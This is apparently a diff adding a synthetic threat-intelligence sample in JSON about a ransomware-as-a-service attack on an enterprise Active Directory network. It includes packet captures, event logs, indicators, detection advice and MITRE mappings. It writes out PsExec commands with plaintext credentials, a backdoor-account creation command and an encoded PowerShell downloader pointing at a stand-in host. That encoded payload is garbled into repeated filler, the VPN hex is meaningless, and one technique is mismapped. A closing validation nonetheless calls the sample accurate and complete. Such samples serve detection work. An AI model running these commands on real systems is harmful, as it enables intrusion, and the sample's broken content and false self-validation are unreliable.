@@ -1,0 +1,121 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Enterprise",
+        "nature": "ransomware_as_a_service"
+      },
+      "example": {
+        "scenario": "Ransomware-as-a-Service operator deploys a multi-stage attack targeting an enterprise's Windows Active Directory environment by exploiting a vulnerable VPN appliance, delivering a ransomware payload through PSExec lateral movement and implementing double extortion tactics via data exfiltration to a cloud storage drop.",
+        "technical_data": {
+          "network_capture": {
+            "description": "Excerpt of network traffic showing initial VPN exploit attempt and subsequent SMB lateral movement",
+            "packets": [
+              "Frame 1: 60 bytes on wire (480 bits), 60 bytes captured (480 bits)",
+              "Ethernet II, Src: 00:0c:29:4f:8e:35, Dst: 00:50:56:c0:00:08",
+              "Internet Protocol Version 4, Src: 198.51.100.23, Dst: 10.10.10.10",
+              "Transmission Control Protocol, Src Port: 443, Dst Port: 54425, Seq: 1, Ack: 1",
+              "TLSv1.2 Record Layer: Application Data Protocol: VPN Exploit Payload",
+              "Payload (hex): 16 03 03 00 8a 17 03 03 5f 9c c8 4a 27 3e 20 19 00 00 38 00 1d 00 17 00 0a 00 16 00 13 00 0d 00 0f 00 05 00 06 00 12 00 09 00 14 00 11 00 08 00 04 00 02 00 0b 00 0c 00 15 00 05 00 0e 00 0f 00 10",
+              "Frame 5: 98 bytes on wire (784 bits), 98 bytes captured (784 bits)",
+              "Ethernet II, Src: 00:50:56:c0:00:08, Dst: 00:0c:29:4f:8e:35",
+              "Internet Protocol Version 4, Src: 10.10.10.10, Dst: 10.10.10.15",
+              "Server Message Block (SMB) Protocol",
+              "SMB2 Session Setup Request, Flags: 0x00000008",
+              "Payload (ASCII): psexec /accepteula -u DOMAIN\\admin -p 'P@ssw0rd!' \\\\10.10.10.15 cmd.exe /c whoami"
+            ]
+          },
+          "windows_event_logs": {
+            "description": "Windows Security logs showing suspicious process creation and lateral movement",
+            "events": [
+              {
+                "EventID": 4688,
+                "Timestamp": "2024-05-20T10:15:32Z",
+                "AccountName": "svc_backup",
+                "ProcessName": "C:\\Windows\\System32\\psexec.exe",
+                "CommandLine": "psexec \\\\10.10.10.15 -u DOMAIN\\admin -p P@ssw0rd! cmd.exe /c net user attacker P@ssw0rd! /add",
+                "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+              },
+              {
+                "EventID": 5145,
+                "Timestamp": "2024-05-20T10:16:05Z",
+                "AccountName": "attacker",
+                "ObjectName": "\\\\10.10.10.20\\C$\\Users",
+                "AccessMask": "Read Data",
+                "AccessGranted": true
+              }
+            ]
+          },
+          "powershell_script": {
+            "description": "Base64 encoded PowerShell command used for ransomware payload deployment",
+            "code": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand UwB0AGEAcgB0AC0AUABvAHcAZQByAFMAaABlAGwAbAAgAC0AVQBzAGUAcgBOAGEAbQBlACAAJwBkAG8AdwBuAGwAbwBhAGQAZQByACcAIAB8ACAAJABpAG4AdABlAHIAbgBlAHQALgB3AGUAYgBDAHAAIAAtAFQAYQByAGcAZQB0ACAAJwBzAGMAcgBpAHAAdAALAAoAJABiAGEAcwBlAD0gJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGYAbABhAHcAcwAuAGUAeABlACcALAAkAGYAbABhAHcALgBlAHgAZQAgLwBDAG8AbQBtAGEAbgBkAGwAZQAgLwBDAG8AbQBtAGEAbgBkAGwAZQAgLwBDAG8AbQBtAGEAbgBkAGwAZQAgLwBDAG8AbQBtAGEAbgBkAGwAZQAgLwBDAG8AbQBtAGEAbgBkAGwAZQAgLwBDAG8AbQBtAGEAbgBkAGwAZQAgLwBDAG8AbQBtAGEAbgBkAGwAZQAgLwBDAG8AbQBtAGEAbgBkAGwAZQAgLwBDAG8AbQBtAGEAbgBkAGwAZQAgLwBDAG8AbQBtAGEAbgBkAGwAZQAgLwBDAG8AbQBtAGEAbgBkAGwAZQAgLwBDAG8AbQBtAGEAbgBkAGwAZQAgLwBzAGYAbAAgAC0AYwAgAC0AZgAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0AYwAgAC0A=="
+          },
+          "file_artifacts": {
+            "filenames": [
+              "C:\\Users\\Public\\documents\\FLaws.exe",
+              "C:\\Windows\\Temp\\{random}.tmp"
+            ],
+            "hashes": {
+              "MD5": "a1b2c3d4e5f67890123456789abcdef0",
+              "SHA-1": "1a2b3c4d5e6f7890123456789abcdef012345678",
+              "SHA-256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+            }
+          },
+          "exfiltration_logs": {
+            "cloud_storage_access": [
+              {
+                "timestamp": "2024-05-20T10:20:00Z",
+                "action": "PutObject",
+                "bucket_name": "enterprise-data-backup",
+                "object_key": "exfiltrated_data/finance_2024.zip.enc",
+                "source_ip": "10.10.10.10",
+                "user_agent": "S3Cmd/2.0.2"
+              }
+            ]
+          }
+        },
+        "indicators": {
+          "ip_addresses": [
+            "198.51.100.23",
+            "10.10.10.10",
+            "10.10.10.15",
+            "10.10.10.20"
+          ],
+          "filenames": [
+            "FLaws.exe",
+            "{random}.tmp"
+          ],
+          "hashes": [
+            "a1b2c3d4e5f67890123456789abcdef0",
+            "1a2b3c4d5e6f7890123456789abcdef012345678",
+            "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+          ],
+          "user_agents": [
+            "S3Cmd/2.0.2"
+          ],
+          "commands": [
+            "psexec \\\\10.10.10.15 -u DOMAIN\\admin -p P@ssw0rd! cmd.exe /c whoami",
+            "net user attacker P@ssw0rd! /add"
+          ]
+        },
+        "detection_method": "Monitor for anomalous VPN traffic volume and TLS application data payloads using IDS; correlate Windows Security Event ID 4688 for suspicious process creation involving psexec.exe; detect unusual SMB session setup events (Event ID 5145) with new or unexpected account usage; flag PowerShell execution with encoded commands especially those invoking external payloads; monitor cloud storage access logs for unexpected PutObject operations from internal hosts; implement EDR behavioral detection for lateral movement and credential misuse.",
+        "relevant_mitre_techniques": [
+          "T1569.002 - System Services: Service Execution via PsExec",
+          "T1078 - Valid Accounts",
+          "T1021.002 - Remote Services: SMB/Windows Admin Shares",
+          "T1059.001 - Command and Scripting Interpreter: PowerShell",
+          "T1499 - Endpoint Denial of Service",
+          "T1486 - Data Encrypted for Impact",
+          "T1041 - Exfiltration Over C2 Channel",
+          "T1133 - External Remote Services"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a ransomware-as-a-service (RaaS) attack scenario targeting an enterprise environment. It includes a realistic multi-stage attack chain starting with exploitation of a vulnerable VPN appliance, lateral movement using PsExec, deployment of ransomware via PowerShell encoded commands, and double extortion through data exfiltration to cloud storage. The technical data fields are comprehensive and detailed, including network captures, Windows event logs, PowerShell payload, file artifacts with hashes, and exfiltration logs, all consistent with the described attack. Indicators are clearly extracted and mapped to the technical data, supporting detection and response efforts. The detection method is well-aligned with the attack techniques and includes monitoring of VPN traffic, Windows event correlation, PowerShell command analysis, cloud storage access, and EDR behavioral detection. Relevant MITRE ATT&CK techniques are correctly identified and cover the attack stages. Overall, the sample is complete, realistic, and correctly aligned with the ransomware-as-a-service problem nature and recommended risk reduction strategies."
+      }
+    }
+  ]
+}
